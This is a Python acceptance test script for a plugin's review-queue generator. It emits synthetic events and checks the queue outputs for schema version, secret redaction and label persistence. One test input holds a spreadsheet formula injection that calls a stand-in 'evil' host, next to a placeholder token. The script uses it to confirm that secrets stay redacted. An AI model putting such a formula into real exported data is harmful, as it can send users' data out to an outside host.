#!/usr/bin/env python3
from __future__ import annotations
"""v2.5.0 reviewer-facing queue deterministic/live smoke acceptance.

Updated for the v2.5.0 release: events are emitted with schema 1.3,
plugin_version 2.5.0, cohort v2.5.0_live (reviewer blocker B8: the old
script was pinned to v2.4.6/2.4.16/schema 1.2 and failed its own checks).
"""
import csv
import json
import os
import shutil
import subprocess
import sys
import tempfile
import time
from pathlib import Path
from datetime import datetime, timezone

SOURCE_ROOT = Path(os.environ.get("CAPABILITY_REUSE_SOURCE_ROOT", Path(__file__).resolve().parents[1]))
ACCEPTANCE_HOME = Path(os.environ.get("CAPABILITY_REUSE_ACCEPTANCE_HOME", tempfile.mkdtemp(prefix="capreuse-v2418-acceptance-"))).resolve()
os.environ["HOME"] = str(ACCEPTANCE_HOME)
HOME = ACCEPTANCE_HOME
PLUGIN_DIR = SOURCE_ROOT / "plugin"
SCRIPT = SOURCE_ROOT / "scripts/generate-review-queue-v245.py"
OUT = HOME / ".hermes/data/reuse-aggregati"
REVIEW = OUT / "review"
COHORT = HOME / ".hermes/data/reuse-observer/cohort.json"
if str(PLUGIN_DIR) not in sys.path:
    sys.path.insert(0, str(PLUGIN_DIR))

import event_store  # noqa: E402
event_store.EVENT_DIR = HOME / ".hermes/data/reuse-observer"
event_store.EVENT_LOG = event_store.EVENT_DIR / "events.jsonl"
event_store.SESSION_LOG = event_store.EVENT_DIR / "session-context.jsonl"
from review_queue import append_human_label, load_latest_labels  # noqa: E402


def now():
    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")


def set_cohort():
    dep = "dep-v2418-review-" + hex(int(time.time()))[2:]
    data = {
        "deployment_id": dep,
        "deployment_timestamp": now(),
        "plugin_version": "2.5.0",
        "plugin_artifact_hash": "v2418-reviewer-queue-local",
        "schema_version": "1.3",
        "cohort_label": "v2.5.0_live",
    }
    COHORT.parent.mkdir(parents=True, exist_ok=True)
    COHORT.write_text(json.dumps(data, indent=2), encoding="utf-8")
    return data


def requester_for(kind, i):
    if kind == "hmp":
        return {"actor_type": "agent", "actor_id": "hmp:peer106", "request_channel": "hmp", "requester_peer_id": "peer106", "processing_peer_id": "peer70"}
    if kind == "telegram":
        return {"actor_type": "human", "actor_id": "telegram_user:sha256:test", "request_channel": "telegram", "requester_peer_id": "", "processing_peer_id": "peer70"}
    if kind == "cron":
        return {"actor_type": "scheduler", "actor_id": "cron:v2418-smoke", "request_channel": "cron", "requester_peer_id": "", "processing_peer_id": "peer70"}
    return {"actor_type": "unknown", "actor_id": "unknown", "request_channel": "unknown", "requester_peer_id": "", "processing_peer_id": "peer70"}


def emit_case(i, kind="hmp", target="peer128", traffic_type="acceptance_test", text=None):
    text = text or "check HMP health for %s" % target
    candidates = [
        {"capability": "hmp-healthcheck@1.0.0", "score": 0.88, "effect_class": "read_only"},
        {"capability": "peer-heartbeat@1.0.0", "score": 0.41, "effect_class": "read_only"},
    ]
    sid = "v2418-smoke-sess-%02d" % i
    eid = "v2418-smoke-ep-%02d" % i
    tid = "v2418-smoke-turn-%02d" % i
    task = "v2418-smoke-task-%02d" % i
    tool = "v2418-smoke-tool-%02d" % i
    code_hash = "v2418-smoke-code-%02d" % i
    ret_outer = event_store.emit_retrieval(
        session_id=sid,
        user_message_preview=text,
        candidates=candidates,
        top_score=0.88,
        intervened=False,
        latency_ms=1.0,
        episode_id=eid,
        turn_id=tid,
        task_id=task,
        tool_call_id=tool,
        shadow_mode=True,
        provenance="organic_live" if traffic_type in ("organic_peer", "organic_user") else "calibration_probe",
        provenance_detail="v2.5.0 reviewer queue smoke",
        provenance_source="hmp" if kind == "hmp" else kind,
        requester=requester_for(kind, i),
        validated_inputs={"peer_list": [target], "timeout_seconds": 5},
        traffic_type=traffic_type,
    )
    event_store.emit_execute_code_start("GET health preview", code_hash, sid, eid, tid, task, tool, ret_outer or "")
    event_store.emit_execute_code_complete(code_hash, "success", 1.0, None, "", sid, eid, tid, task, tool, ret_outer or "")
    return ret_outer


def validate():
    env = os.environ.copy(); env["HOME"] = str(HOME); env["CAPABILITY_REUSE_SOURCE_ROOT"] = str(SOURCE_ROOT)
    subprocess.run([sys.executable, str(SCRIPT)], check=True, env=env)
    summary = json.loads((REVIEW / "queue-v245-summary.json").read_text())
    acceptance_csv = REVIEW / "queue-v245-acceptance.csv"
    organic_csv = REVIEW / "queue-v245-organic-review.csv"
    rows = list(csv.DictReader(acceptance_csv.open()))
    org_rows = list(csv.DictReader(organic_csv.open()))
    records = [json.loads(line) for line in (REVIEW / "candidates-v245.jsonl").read_text().splitlines() if line.strip()]
    current_dep = json.loads(COHORT.read_text()).get("deployment_id")
    current_acceptance = [r for r in records if (r.get("cohort") or {}).get("deployment_id") == current_dep and (r.get("request") or {}).get("traffic_type") == "acceptance_test"]
    errors = []
    if len(current_acceptance) < 20 or len(current_acceptance) > 30:
        errors.append("current acceptance rows outside 20-30: %s" % len(current_acceptance))
    required = ["review_schema_version", "event_schema_version", "actor_type", "requester_type", "request_channel", "processing_peer_id", "redacted_text", "candidate_capability", "preview_status", "target_peer_id", "command_preview", "auth_mode", "credentials_exposed_in_preview"]
    for idx, row in enumerate(rows[:30]):
        for col in required:
            if row.get(col) in (None, ""):
                errors.append("row %d missing %s" % (idx, col))
        if row.get("event_schema_version") != "1.3": errors.append("row %d not schema 1.3" % idx)
        if "token=SECRET" in json.dumps(row): errors.append("row %d leaked raw secret" % idx)
        if row.get("credentials_exposed_in_preview") != "False": errors.append("row %d credential preview flag not false" % idx)
        if row.get("target_peer_id") == "peer999" and row.get("preview_status") != "unsupported": errors.append("unsupported peer executable-looking row %d" % idx)
        if row.get("target_peer_id") == "peer999" and not row.get("command_preview", "").startswith("NOT EXECUTABLE"):
            errors.append("unsupported peer has executable preview row %d" % idx)
    # requester/processing/target independently represented
    if not any(r.get("requester_peer_id") == "peer106" and r.get("processing_peer_id") == "peer70" and r.get("target_peer_id") == "peer128" for r in rows):
        errors.append("missing independent requester/processing/target evidence")
    if any(r.get("traffic_type") in ("acceptance_test", "calibration_probe", "operator_seeded", "legacy_unclassified", "unknown") for r in org_rows):
        errors.append("synthetic row leaked into organic queue")
    # label ledger survives regeneration
    label_path = REVIEW / "human-labels.jsonl"
    append_human_label(label_path, rows[0]["review_id"], "UNSURE", "insufficient_context", "pre-refresh", "fausto-test", now="2026-08-01T00:00:00Z")
    append_human_label(label_path, rows[0]["review_id"], "ACCEPT", "exact_match", "post-refresh", "fausto-test", supersedes_label_id="label_old", now="2026-08-01T00:01:00Z")
    env = os.environ.copy(); env["HOME"] = str(HOME); env["CAPABILITY_REUSE_SOURCE_ROOT"] = str(SOURCE_ROOT)
    subprocess.run([sys.executable, str(SCRIPT)], check=True, env=env)
    latest = load_latest_labels(label_path)
    if latest.get(rows[0]["review_id"], {}).get("label") != "ACCEPT":
        errors.append("label ledger did not preserve latest label")
    sample = REVIEW / "human-review-sample.md"
    if not sample.exists() or "Would execute" not in sample.read_text():
        errors.append("markdown sample missing or not generated from records")
    return summary, rows, org_rows, errors, len(current_acceptance)


def main():
    cohort = set_cohort()
    emitted = []
    kinds = ["hmp"] * 22 + ["telegram", "cron", "unknown"]
    for i, kind in enumerate(kinds):
        target = "peer999" if i == 3 else "peer128"
        text = "=IMPORTXML('http://evil') check HMP health for %s token=SECRET" % target if i == 4 else None
        emitted.append(emit_case(i, kind=kind, target=target, traffic_type="acceptance_test", text=text))
    # Do not create fake organic traffic; organic filtering is covered by fixture tests.
    summary, rows, org_rows, errors, current_acceptance_rows = validate()
    report = {
        "generated_at": now(),
        "cohort": cohort,
        "emitted_retrievals": len([e for e in emitted if e]),
        "acceptance_rows_total": len(rows),
        "current_acceptance_rows": current_acceptance_rows,
        "organic_rows": len(org_rows),
        "acceptance_home": str(HOME),
        "deterministic_checks": "PASS" if not errors else "FAIL",
        "errors": errors,
        "summary": summary,
        "verdict": "PASS" if not errors else "FAIL",
    }
    OUT.mkdir(parents=True, exist_ok=True)
    (OUT / "acceptance-v245-review-queue.json").write_text(json.dumps(report, indent=2), encoding="utf-8")
    (OUT / "acceptance-v245-review-queue-verdict.txt").write_text(report["verdict"] + "\n", encoding="utf-8")
    print(json.dumps(report, indent=2))
    if errors:
        raise SystemExit(1)


if __name__ == "__main__":
    main()
